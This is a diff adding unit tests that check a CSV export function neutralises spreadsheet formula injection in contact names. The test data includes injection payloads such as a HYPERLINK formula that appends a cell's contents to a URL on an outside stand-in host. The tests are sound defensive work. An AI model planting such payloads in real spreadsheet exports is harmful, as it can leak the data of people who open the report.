@@ -58,6 +58,44 @@ describe('gerarCsv', () => {
   });
 });
 
+/**
+ * Injeção de fórmula.
+ *
+ * O nome do contato vem do formulário público e da planilha importada — texto
+ * de terceiro. Sem o apóstrofo à frente, o Excel EXECUTA a célula quando o
+ * gestor abre o relatório, com a base inteira ao alcance dela.
+ */
+describe('gerarCsv contra injeção de fórmula', () => {
+  const PERIGOSOS = [
+    '=HYPERLINK("http://fora/"&A1,"clique")',
+    '+1+1',
+    '-1+1',
+    '@SUM(A1:A9)',
+    '\tcmd',
+    '\r=1+1',
+  ];
+
+  it.each(PERIGOSOS)('neutraliza %j com apóstrofo e aspas', (valor) => {
+    const csv = gerarCsv([{ nome: valor, total: 1 }], COLUNAS);
+    const celula = csv.split('\r\n')[1].split(';')[0];
+    expect(celula.startsWith(`"'`)).toBe(true);
+    // O conteúdo continua legível para quem lê o relatório.
+    expect(csv).toContain(valor.replace(/"/g, '""'));
+  });
+
+  it('não mexe em texto que só PARECE fórmula no meio', () => {
+    expect(gerarCsv([{ nome: 'Maria = Souza', total: 1 }], COLUNAS)).toContain('Maria = Souza');
+    expect(gerarCsv([{ nome: 'Maria = Souza', total: 1 }], COLUNAS)).not.toContain(`"'`);
+  });
+
+  it('deixa telefone e número em paz', () => {
+    // formatarExibicao já entrega (69) 98123-4567 — sem + na frente.
+    const csv = gerarCsv([{ nome: '(69) 98123-4567', total: 30 }], COLUNAS);
+    expect(csv).toContain('(69) 98123-4567');
+    expect(csv).not.toContain(`"'`);
+  });
+});
+
 describe('dataHoraLocal', () => {
   it('converte para o fuso da operação, não o do servidor', () => {
     // 13:00 UTC = 09:00 em Porto Velho (UTC−4)
